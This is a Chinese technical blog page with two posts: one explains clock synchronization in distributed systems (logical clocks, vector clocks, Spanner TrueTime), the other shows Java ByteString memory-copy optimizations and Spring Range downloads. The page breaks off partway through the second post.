<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>笔记本</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="笔记本">
<meta property="og:url" content="http://xiaoyue26.github.io/index.html">
<meta property="og:site_name" content="笔记本">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="风梦七">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="笔记本" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    
  
  
<link rel="stylesheet" href="/css/style.css">

  

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    
    <div id="header-inner" class="inner">
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://xiaoyue26.github.io"></form>
      </div>
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">首页</a>
        
          <a class="main-nav-link" href="/archives">归档</a>
        
          <a class="main-nav-link" href="/about">关于</a>
        
      </nav>
      
    </div>
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">笔记本</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">风梦七</a>
        </h2>
      
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-2023-09/时钟同步及一致性" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/09/24/2023-09/%E6%97%B6%E9%92%9F%E5%90%8C%E6%AD%A5%E5%8F%8A%E4%B8%80%E8%87%B4%E6%80%A7/" class="article-date">
  <time datetime="2023-09-24T11:34:36.000Z" itemprop="datePublished">2023-09-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%88%86%E5%B8%83%E5%BC%8F/">分布式</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/09/24/2023-09/%E6%97%B6%E9%92%9F%E5%90%8C%E6%AD%A5%E5%8F%8A%E4%B8%80%E8%87%B4%E6%80%A7/">时钟同步及一致性</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <blockquote>
<p>诸行无常为佛教的三法印之一。诸行无常是说一切世间法无时不在生住异灭中，过去有的，现在起了变异；现在有的，将来终归幻灭。</p>
</blockquote>
<p>世间万物都在变化，只有更精确地测量时间，才能分清事物变化的因果、分析规律。</p>
<img src="/images/2023-09/sanfayin.png" class="" width="800" height="1200" title="sanfanyi">

<h1 id="why-为什么需要时钟同步"><a href="#why-为什么需要时钟同步" class="headerlink" title="why: 为什么需要时钟同步"></a>why: 为什么需要时钟同步</h1><ul>
<li><p>应用层:<br>测距：<code>速度*耗时=距离</code>，如果时钟不同步，距离也算不准；<br>限频：比如限制1秒内只能访问1次，如果时钟不同步，1秒内可能是任意时间范围；</p>
</li>
<li><p>通信<br>初始相位、采样对齐能量峰值点：如果不同步，可能每次采样都恰好在能量低谷，什么都采样不到。<br>（解决方案：自同步：一个信道里放两个维度的信息，比如tcp在数据头放seqId、或者在信号里混编特殊信息（同步码、巴克码）<br>或并联时钟同步信道：单开一个专门的信道放恒定峰值脉冲）</p>
</li>
<li><p>一致性协议：需要时钟来生成合法的epoch/term;</p>
</li>
<li><p>db：数据更新，需要确定副本的新旧；</p>
</li>
<li><p>监控：耗时，如果时钟不同步，<code>结束时间-开始时间=耗时</code>就不成立;</p>
</li>
<li><p>日志：事件发生的因果、依赖关系无法根据日志时间确定;</p>
</li>
</ul>
<h1 id="how-如何达到时钟同步"><a href="#how-如何达到时钟同步" class="headerlink" title="how: 如何达到时钟同步"></a>how: 如何达到时钟同步</h1><p>观察者：</p>
<h2 id="物理时钟"><a href="#物理时钟" class="headerlink" title="物理时钟"></a>物理时钟</h2><table>
<thead>
<tr>
<th>时钟类型</th>
<th>误差</th>
<th>物理意义</th>
<th>造价</th>
</tr>
</thead>
<tbody><tr>
<td>日晷（赤道日晷、水平日晷、垂直日晷）</td>
<td>大</td>
<td>天体物理运动。受各种天体运动影响（地球自转会逐渐变慢），不稳定。  天 = 地球自转到太阳照射同一位置的时长（不稳定） 重大缺陷：晚上用不了、下雨阴天也不行。(现代优化：射电望远镜)</td>
<td>低</td>
</tr>
<tr>
<td>滴漏/沙漏</td>
<td>大/5min/小时</td>
<td>重力/摩擦力/基本无法与其他时钟同步。</td>
<td>低</td>
</tr>
<tr>
<td>摆钟</td>
<td>大/20s/天</td>
<td>锚定重力加速度 (单摆定律)可能受各种天体运动影响（例如月球潮汐），不稳定。</td>
<td>低</td>
</tr>
<tr>
<td>石英钟(SiO2)</td>
<td>一般/0.5s/天（优等品）</td>
<td>压电效应/石英晶体振荡器的频率是32768Hz,受温度影响大</td>
<td>低</td>
</tr>
<tr>
<td>铯原子钟</td>
<td>极低/1s/2000万年</td>
<td>铯原子(0K)跃迁 9192631770 个周期=1秒(用电子能级跃迁发出的电磁波频率去校准电子振荡器，所以和别的利用天体物理结果的时钟不同步，但更稳定)</td>
<td>很高（十万～百万级）</td>
</tr>
<tr>
<td>NTP（Network Time Protocol）</td>
<td>100ms</td>
<td>定期从时间服务器同步时间，所以可以对齐其他类型的时钟。 受网络延迟影响。</td>
<td>低</td>
</tr>
</tbody></table>
<p>同一种物理意义的时钟之间可能可以同步，因为物理常数可能相同；（比如原理都是重力加速度时）<br>不同物理意义的时钟之间一般是无法同步的，因为锚定的规律都不同，这种情况一般都要通过NTP来对齐。</p>
<h2 id="时间标准"><a href="#时间标准" class="headerlink" title="时间标准"></a>时间标准</h2><p>UT（世界时、Universal Time）：基于天体观察的时间（太阳（太阳时）或其他恒星（恒星时）换算）。（秒的长度按全年平均计算）<br>GMT（格林尼治标准时间、Greenwich Mean Time）：以格林尼治天文台为观测点的世界时。<br>TAI（国际原子时、InternationalAtomic Time）：基于原子钟的时间<br>UTC（协调世界时）：平时跟随原子时，但为了人们作息使用，定期同步世界时的时间（闰秒）</p>
<p>虽然根据太阳时的时间不太稳定，但是我们地球生物都依赖它来作息，所以只能平时用稳定的时间（如原子时），定期对齐太阳时。<br>也就是定义UTC的起因（协调）。</p>
<h2 id="逻辑时钟"><a href="#逻辑时钟" class="headerlink" title="逻辑时钟"></a>逻辑时钟</h2><blockquote>
<p><a href="https://lamport.azurewebsites.net/pubs/time-clocks.pdf" target="_blank" rel="noopener">Time, Clocks and the Ordering of Events in a Distributed System</a><br>lamport时间戳</p>
</blockquote>
<p>类似于JVM内存模型中<code>Happen Before</code>规则，逻辑时钟的<code>Happen Before</code>规则：</p>
<ol>
<li>本地：a和b是同一个进程内的事件，a发生在b之前，则 a → b。</li>
<li>远程：a和b在不同的进程中，a是发送进程内的发送事件，b是同一消息接收进程内的接收事件，则 a → b。</li>
<li>传递性：如果a → b并且b → c，则a → c。</li>
</ol>
<blockquote>
<p>JVM内存模型中的Happen Before:<br>  线：线程先start后run;<br>  程：程序顺序（本地性）<br>  原:  原子变量(volatile)先写后读；<br>  锁:  先解锁别人才能获得锁；<br>  终:  先构造才能终结；<br>  中：先中断别人才能检测到中断；<br>  传：以上规则可以传递</p>
</blockquote>
<h3 id="逻辑时钟的一种实现："><a href="#逻辑时钟的一种实现：" class="headerlink" title="逻辑时钟的一种实现："></a>逻辑时钟的一种实现：</h3><p>分布式系统中每个进程Pi保存一个本地逻辑时钟值<code>Ci</code>，<code>Ci (a)</code>表示进程<code>Pi</code>发生事件<code>a</code>时的逻辑时钟值，<code>Ci</code>的更新算法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">进程Pi事件：Ci+&#x3D;p。(实际p一般&#x3D;1)</span><br><span class="line">进程Pi-&gt;进程Pj:  Ci。</span><br><span class="line">进程Pj:  Cj &#x3D; max (Ci, Cj) + p。(实际p一般&#x3D;1)</span><br></pre></td></tr></table></figure>

<p>递增序列，事件驱动：只处理偏序关系(<code>happen before</code>)；<br>（偏序集、一个元素至少有另一个可以比较顺序）<br>因为可能有不互相依赖的事件，无法判断先后，只能认为是”同时”。</p>
<blockquote>
<p>MySQL 5.7二进制日志较之原来的二进制日志内容多了last_committed和sequence_number这两项内容。<br>这两个值即所谓的”逻辑时间戳标记（Logical Clock）”，可以用于控制多线程复制（MTS）特性。</p>
</blockquote>
<blockquote>
<p> <code>sequence_number</code>：该值随着事务顺序增长，每个事务对应一个序列号。<br>该值在事务二阶段提交的<code>Prepare</code>阶段被记录存储，用于标记最新提交的事务。</p>
</blockquote>
<blockquote>
<p> <code>last_committed</code>：表示事务提交的时候，上次事务提交的序列号（<code>sequence_number</code>），<br>如果事务具有相同的<code>last_committed</code>，则表示这些事务都在一组内。该值在事务二阶段提交的<code>Commit</code>阶段被记录存储。</p>
</blockquote>
<h3 id="逻辑时钟的问题"><a href="#逻辑时钟的问题" class="headerlink" title="逻辑时钟的问题"></a>逻辑时钟的问题</h3><p>写：无依赖时无序（同时）；</p>
<blockquote>
<p>“同时”带来的问题，有了数据也不知道原因：<br>a -&gt; b , 则 Ci(a) &lt; Ci(b) // 充分条件<br>Ci(a) &lt; Ci(b)，不并代表 a-&gt;b // 不必要，因为有同时的情况，可能a,b其实同时发生。</p>
</blockquote>
<p>读：读往往不带版本号、怎么处理？（也无最新的概念）</p>
<h3 id="偏序和全序"><a href="#偏序和全序" class="headerlink" title="偏序和全序"></a>偏序和全序</h3><h4 id="偏序"><a href="#偏序" class="headerlink" title="偏序"></a>偏序</h4><p>给定集合S，”≤”是S上的二元关系，若”≤”满足：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 自反性：∀a∈S，有a≤a；</span><br><span class="line">2. 反对称性：∀a，b∈S，a≤b且b≤a，则a&#x3D;b；</span><br><span class="line">3. 传递性：∀a，b，c∈S，a≤b且b≤c，则a≤c；</span><br><span class="line">则称&quot;≤&quot;是S上的非严格偏序或自反偏序。</span><br></pre></td></tr></table></figure>


<h4 id="全序"><a href="#全序" class="headerlink" title="全序"></a>全序</h4><p>全序关系即集合X上的反对称的、传递的和完全的二元关系（一般称其为 ≤)。<br>若X满足全序关系，则下列陈述对于X中的所有a,b和c成立：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 反对称性：若a ≤ b且b ≤ a 则 a&#x3D;b</span><br><span class="line">2. 传递性：若a ≤ b且b ≤ c则a ≤ c</span><br><span class="line">3. 完全性：a ≤ b或b ≤ a</span><br></pre></td></tr></table></figure>



<p>偏序 =&gt; 全序（增加完全性，任意俩元素都可以比较）：<br>raft\multi-paxos的解法：把写者变成一个<br>// 把偏序变全序的核心是增大共识范围，同时降低洪泛通信<br>其他解法：<code>向量时钟</code>、<code>True Time</code></p>
<h2 id="向量时钟"><a href="#向量时钟" class="headerlink" title="向量时钟"></a>向量时钟</h2><blockquote>
<p>数据库亚马逊 Dynamo </p>
</blockquote>
<p>解决逻辑时钟的一个朴素方案是：拓展逻辑时钟：从单播、多播事件改成广播；确保全序关系（全序集：任意两个有时间先后顺序）。<br>（问题：通信成本过于高了，洪泛）</p>
<p>向量时钟的方法：<br>进程通信时，不但发送本进程时钟，还发送本进程知道的所有其他进程的时钟值（向量V）。</p>
<p>分布式系统中每个进程Pi保存一个本地逻辑时钟向量值<code>VCi</code>，<br>（向量的长度是分布式系统中进程的总个数）<br><code>VCi (j)</code>表示进程Pi知道的进程Pj的本地逻辑时钟值，<code>VCi</code>的更新算法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.初始: VCi的值全为0：VCi &#x3D; [0, … , 0]</span><br><span class="line">2.进程Pi事件: VCi[i]+&#x3D;p (实际p一般&#x3D;1)</span><br><span class="line">3.进程Pi-&gt;进程Pj: VCi</span><br><span class="line">4.进程Pj:</span><br><span class="line">4.1 对于VCj向量中的每个值VCj[k]，VCj[k] &#x3D; max (VCi[k], VCj[k]) &#x2F;&#x2F; 更新其他进程的时钟</span><br><span class="line">4.2 VCj[j]+&#x3D;p (实际p一般&#x3D;1) &#x2F;&#x2F; 更新自己的</span><br></pre></td></tr></table></figure>

<p>向量之间如何比较大小：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于每个k，VCi[k]  &lt;&#x3D; VCj[k]，则VCi ≤ VCj; &#x2F;&#x2F; 每个元素都要&lt;&#x3D;</span><br></pre></td></tr></table></figure>

<p>类似的，如果每个元素都相等，那VCi = VCj<br>如果各个元素的大小关系有大有小不一致，那就是同时。</p>
<p>这个算法大框架和原来的逻辑时钟几乎一样，显然向量的集合是个偏序集。<br>那么能进一步强化充要条件，也就是，是否有：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">若VC(a)&lt;VC(b)， 则 a-&gt;b。</span><br></pre></td></tr></table></figure>
<p>分类讨论：<br>1.同一进程内：显然成立；<br>2.不同进程：<br>由于<code>VCi(a)</code>&lt;<code>VCj(b)</code>,也就是VC内每个元素都小于<br>直接用<code>VCi[i]</code>来指代有点乱，因为只涉及两维，直接改成x,y也就是:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(x1,y1) &lt; (x2, y2) 等价于:</span><br><span class="line">(1)x1 &lt; x2;</span><br><span class="line">(2)y1 &lt; y2;</span><br></pre></td></tr></table></figure>
<p>假设有其他事件: <code>c(x1, y2)</code> 或 <code>d(x2, y1)</code>来构造传递性：（当然实际可能经过了更多中间节点）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">则a&lt;c, c&lt;b 推导出 a&lt;b</span><br><span class="line">或a&lt;d, d&lt;b 推导出 a&lt;b</span><br></pre></td></tr></table></figure>
<p>综上，虽然向量时钟中依然有”同时”情况，但对于存在因果、依赖的连通子图，已经能形成局部的全序集合，也就是在”视界”内是全序的，已经能满足实际应用。（相比之下，逻辑时钟仅在1度关系内能判定因果）</p>
<h2 id="True-Time-TT"><a href="#True-Time-TT" class="headerlink" title="True Time(TT)"></a>True Time(TT)</h2><blockquote>
<p>[Spanner: Google’s Globally-Distributed Database]<a href="https://pdos.csail.mit.edu/6.824/papers/spanner.pdf" target="_blank" rel="noopener">https://pdos.csail.mit.edu/6.824/papers/spanner.pdf</a></p>
</blockquote>
<p>整体架构可以看作一个升级版的NTP.</p>
<h3 id="NTP架构"><a href="#NTP架构" class="headerlink" title="NTP架构"></a>NTP架构</h3><img src="/images/2023-09/ntp.png" class="" width="800" height="1200" title="ntp">


<h3 id="TT架构"><a href="#TT架构" class="headerlink" title="TT架构"></a>TT架构</h3><img src="/images/2023-09/TT.png" class="" width="800" height="1200" title="tt">
<p>原子钟+GPS时钟（因相对论，更快）+每个数据中心的time mater集群。</p>
<p>误差：1～7ms</p>
<table>
<thead>
<tr>
<th>接口</th>
<th>返回</th>
</tr>
</thead>
<tbody><tr>
<td>TT.now()</td>
<td>[earliest,latest] 最大间隔7ms,返回一个范围区间,真实时间位于这个区间内</td>
</tr>
<tr>
<td>TT.after(t)</td>
<td>boolean，当前真实时间是否晚于t</td>
</tr>
<tr>
<td>TT.before(t)</td>
<td>boolean，当前真实时间是否早于t</td>
</tr>
</tbody></table>
<p>Spanner采用MVCC机制，因此数据副本上需要一个时间戳Si。</p>
<h3 id="读写事务"><a href="#读写事务" class="headerlink" title="读写事务"></a>读写事务</h3><p>提交过程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.Si &gt;&#x3D; TT.now()的lastest，作为提交时间戳；</span><br><span class="line">2.Cond wat: 等待TT.after(Si)为true时才提交；</span><br></pre></td></tr></table></figure>

<p>平均总等待时长8ms，所以同一份数据的tps = 125。</p>
<blockquote>
<p>谷歌：We believe it is better to have application programmers deal with performance problems due to overuse of transactions as bottlenecks arise, rather than always coding around the lack of transactions.<br>我来翻译一下就是：这性能够了，太依赖事务导致性能不行是业务开发设计有问题。</p>
</blockquote>
<h3 id="只读事务"><a href="#只读事务" class="headerlink" title="只读事务"></a>只读事务</h3><p> 快照读：事务开始后，取<code>TT.now().latest</code>作为过滤(before)的时间戳。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p> <a href="https://ost.51cto.com/posts/15990" target="_blank" rel="noopener">https://ost.51cto.com/posts/15990</a><br> utc协调事件时：<a href="https://kstack.corp.kuaishou.com/article/7767" target="_blank" rel="noopener">https://kstack.corp.kuaishou.com/article/7767</a><br> 组提交：<a href="https://developer.aliyun.com/article/617776" target="_blank" rel="noopener">https://developer.aliyun.com/article/617776</a><br> 偏序：<a href="https://zhuanlan.zhihu.com/p/44665237" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/44665237</a><br> <a href="https://zhuanlan.zhihu.com/p/651456126" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/651456126</a><br> <a href="https://zhuanlan.zhihu.com/p/35473260" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/35473260</a><br> <a href="http://yang.observer/2020/11/02/true-time/" target="_blank" rel="noopener">http://yang.observer/2020/11/02/true-time/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2023/09/24/2023-09/%E6%97%B6%E9%92%9F%E5%90%8C%E6%AD%A5%E5%8F%8A%E4%B8%80%E8%87%B4%E6%80%A7/" data-id="clmxe4jv90000bfi528pa9nl2" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Spanner/" rel="tag">Spanner</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%B8%80%E8%87%B4%E6%80%A7/" rel="tag">一致性</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%90%91%E9%87%8F%E6%97%B6%E9%92%9F/" rel="tag">向量时钟</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%80%BB%E8%BE%91%E6%97%B6%E9%92%9F/" rel="tag">逻辑时钟</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2023-02/调优-ByteString相关内存拷贝问题" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/02/03/2023-02/%E8%B0%83%E4%BC%98-ByteString%E7%9B%B8%E5%85%B3%E5%86%85%E5%AD%98%E6%8B%B7%E8%B4%9D%E9%97%AE%E9%A2%98/" class="article-date">
  <time datetime="2023-02-03T03:01:39.000Z" itemprop="datePublished">2023-02-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/java/">java</a>►<a class="article-category-link" href="/categories/java/%E6%80%A7%E8%83%BD/">性能</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/02/03/2023-02/%E8%B0%83%E4%BC%98-ByteString%E7%9B%B8%E5%85%B3%E5%86%85%E5%AD%98%E6%8B%B7%E8%B4%9D%E9%97%AE%E9%A2%98/">调优-ByteString相关内存拷贝问题</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>媒体中心api内存消耗较大，检查内存分配情况:</p>
<img src="/images/2023-02/bytestring-background.png" class="" width="800" height="1200" title="background">

<p>对应的伪代码:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="keyword">byte</span>[] bytes = BlobStore.loadFile(); </span><br><span class="line"><span class="number">2</span>. ByteString pb = ByteString.copyFrom(bytes); </span><br><span class="line"><span class="number">3</span>. ByteString afterDecrypt = callRpc(pb); <span class="comment">// 2次拷贝 </span></span><br><span class="line"><span class="number">4</span>. <span class="keyword">byte</span>[] decryptBytes = afterDecryp.toByteArray(); </span><br><span class="line"><span class="number">5</span>. <span class="keyword">byte</span>[] resp = XXXUtils.downloadRange(decryptBytes);</span><br></pre></td></tr></table></figure>

<p>涉及到的堆内内存申请：（堆外暂且不管）<br>1.业务线程: 从blobstore读取数据；<br>2.业务线程: 解密前拷贝给pb；<br>3.grpc线程: 接收rpc结果;<br>4.grpc线程: 从结果拷贝到resp;<br>5.业务线程: 从resp拷贝到byte[];<br>6.业务线程: range下载,byte[]到byte[]。</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="ByteString-copyFrom优化"><a href="#ByteString-copyFrom优化" class="headerlink" title="ByteString.copyFrom优化"></a>ByteString.copyFrom优化</h2><h3 id="常规写法"><a href="#常规写法" class="headerlink" title="常规写法"></a>常规写法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] videoBytes = doLoadFile(videoKey);</span><br><span class="line"><span class="keyword">return</span> ByteString.copyFrom(videoBytes);</span><br></pre></td></tr></table></figure>
<p>会多一份内存申请的内存消耗和拷贝的性能消耗。</p>
<blockquote>
<p>ByteString 实例通常使用 ByteString.CopyFrom(byte[] data) 创建。 此方法会分配新的 ByteString 和新的 byte[]。 数据会复制到新的字节数组中。</p>
</blockquote>
<p>  通过使用 UnsafeByteOperations.UnsafeWrap(ReadOnlyMemory<byte> bytes) 创建 ByteString 实例，可以避免其他分配和复制操作。</p>
<h3 id="优化写法"><a href="#优化写法" class="headerlink" title="优化写法"></a>优化写法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 要求fileBytes是immutable的，数据不能再修改</span></span><br><span class="line">ByteString data = UnsafeByteOperations.unsafeWrap(fileBytes);</span><br></pre></td></tr></table></figure>

<h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><p>1。 UnsafeByteOperations.UnsafeWrap 要求使用 Google.Protobuf 版本 3.15.0 或更高版本：<br>参考:<br><a href="https://learn.microsoft.com/zh-cn/aspnet/core/grpc/performance?view=aspnetcore-7.0" target="_blank" rel="noopener">https://learn.microsoft.com/zh-cn/aspnet/core/grpc/performance?view=aspnetcore-7.0</a><br>2。 如果修改了数据可能会导致抛各种异常:<br>参考: <a href="https://cloud.google.com/java/docs/reference/protobuf/latest/com.google.protobuf.UnsafeByteOperations" target="_blank" rel="noopener">https://cloud.google.com/java/docs/reference/protobuf/latest/com.google.protobuf.UnsafeByteOperations</a></p>
<h1 id="ByteString-toByteArray优化"><a href="#ByteString-toByteArray优化" class="headerlink" title="ByteString.toByteArray优化"></a>ByteString.toByteArray优化</h1><p>ByteString有多种实现，不一定内部有byte数组,所以要根据实际情况选择<code>inputStream</code>或者<code>byte</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 方法1:</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> InputStream <span class="title">newInput</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 2. 方法2:</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> ByteBuffer <span class="title">asReadOnlyByteBuffer</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<h2 id="RangeDownload优化"><a href="#RangeDownload优化" class="headerlink" title="RangeDownload优化"></a>RangeDownload优化</h2><p>spring5的<code>org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor</code>默认实现对于大部分Resouce类型的Http Range协议支持，尽量不要自己实现Range协议，因为里面的规范、边界还是很多很繁琐的；<br>目前XXXUtils实现的版本就会多一次byte数组的拷贝问题，也没有实现全部规范。<br>spring的处理源码:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor#writeWithMessageConverters(T, org.springframework.core.MethodParameter, org.springframework.http.server.ServletServerHttpRequest, org.springframework.http.server.ServletServerHttpResponse)</span></span><br><span class="line"><span class="keyword">if</span> (isResourceType(value, returnType)) &#123;</span><br><span class="line">			outputMessage.getHeaders().set(HttpHeaders.ACCEPT_RANGES, <span class="string">"bytes"</span>);</span><br><span class="line">			<span class="keyword">if</span> (value != <span class="keyword">null</span> &amp;&amp; inputMessage.getHeaders().getFirst(HttpHeaders.RANGE) != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">					outputMessage.getServletResponse().getStatus() == <span class="number">200</span>) &#123;</span><br><span class="line">				Resource resource = (Resource) value;</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					List&lt;HttpRange&gt; httpRanges = inputMessage.getHeaders().getRange();</span><br><span class="line">					outputMessage.getServletResponse().setStatus(HttpStatus.PARTIAL_CONTENT.value());</span><br><span class="line">					body = HttpRange.toResourceRegions(httpRanges, resource);</span><br><span class="line">					valueType = body.getClass();</span><br><span class="line">					targetType = RESOURCE_REGION_LIST_TYPE;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">catch</span> (IllegalArgumentException ex) &#123;</span><br><span class="line">					outputMessage.getHeaders().set(HttpHeaders.CONTENT_RANGE, <span class="string">"bytes */"</span> + resource.contentLength());</span><br><span class="line">					outputMessage.getServletResponse().setStatus(HttpStatus.REQUESTED_RANGE_NOT_SATISFIABLE.value());</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<h3 id="示例使用"><a href="#示例使用" class="headerlink" title="示例使用"></a>示例使用</h3><p>底层是byte数组时:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/load"</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseEntity&lt;ByteArrayResource&gt; <span class="title">load</span><span class="params">(@RequestParam(value = <span class="string">"fileKey"</span>)</span> String fileKey, HttpServletRequest request) </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] fileBytes = doLoadFile(fileKey, <span class="keyword">false</span>);</span><br><span class="line">        MediaType mediaType = parseMediaType(fileKey);</span><br><span class="line">        <span class="keyword">final</span> HttpHeaders headers = <span class="keyword">new</span> HttpHeaders();</span><br><span class="line">        headers.setContentType(mediaType);</span><br><span class="line">        headers.set(<span class="string">"Content-Disposition"</span>, <span class="string">"attachment; filename="</span> + fileKey);</span><br><span class="line">        headers.set(<span class="string">"Access-Control-Allow-Headers"</span>, <span class="string">"Range,Content-Length"</span>);</span><br><span class="line">        headers.set(<span class="string">"Access-Control-Allow-Methods"</span>, <span class="string">"GET,POST,OPTIONS"</span>);</span><br><span class="line">        headers.set(<span class="string">"Access-Control-Allow-Origin"</span>, <span class="string">"*"</span>);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok()</span><br><span class="line">                .headers(headers)</span><br><span class="line">                .body(<span class="keyword">new</span> ByteArrayResource(fileBytes));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>底层是ByteString时:</p>
